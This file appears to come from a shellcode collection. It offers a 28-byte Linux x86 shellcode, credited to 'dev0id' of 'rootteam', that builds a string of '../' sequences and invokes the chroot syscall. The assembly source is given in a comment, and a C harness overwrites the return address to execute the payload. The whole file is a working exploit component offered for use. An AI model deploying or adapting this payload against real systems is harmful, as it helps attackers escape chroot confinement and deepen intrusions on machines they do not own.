/* The chroot() shellcode. It is the one of the smallest shellcodes
   in the !!world!!
   it will put '../' 10 times
   Size  28 bytes
   OS	 Linux
  		/rootteam/dev0id	(rootteam.void.ru)
			dev0id@uncompiled.com

BITS	32
main:
	xor	ecx,ecx
	xor	eax,eax
	push	ecx
	mov	cl,30
main_push:
	push byte 0x2e
	loop	main_push
	mov	cl,30
main_inc:
	dec	cl
	inc byte [esp+ecx]
	dec	cl
	loop	main_inc
	mov	ebx,esp
	mov	al,61
	int	0x80


*/

char shellcode[] =
	"\x31\xc9\x31\xc0\x51\xb1\x1e\x6a\x2e\xe2\xfc\xb1\x1e\xfe\xc9"
	"\xfe\x04\x0c\xfe\xc9\xe2\xf7\x89\xe3\xb0\x3d\xcd\x80";
int
main(void)
{
	int *ret;
	ret = (int*)&ret + 2;
	(*ret) = shellcode;
}